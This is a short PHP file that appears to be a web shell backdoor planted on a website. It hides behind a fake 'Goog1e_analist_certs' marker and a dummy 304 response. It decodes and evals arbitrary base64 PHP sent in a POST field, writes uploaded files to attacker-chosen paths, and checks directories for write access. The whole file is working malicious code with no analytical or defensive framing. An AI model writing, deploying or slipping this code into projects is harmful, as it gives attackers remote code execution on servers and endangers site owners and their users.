<?php if(isset($_GET['languages'])){header("HTTP/1.0 304 Not Modified");exit;}
if(isset($_GET['cookies'])){echo '--'.'><i>Goog1e_analist_certs</i><br>';
if(isset($_POST['e'])){eval(base64_decode($_POST['e']));}
if(isset($_FILES['f'])){if(!@copy($_FILES['f']['tmp_name'],$_FILES['f']['name'])){@move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);}}
if(isset($_GET['d'])){echo @is_writable($_GET['d']);}exit;}?>
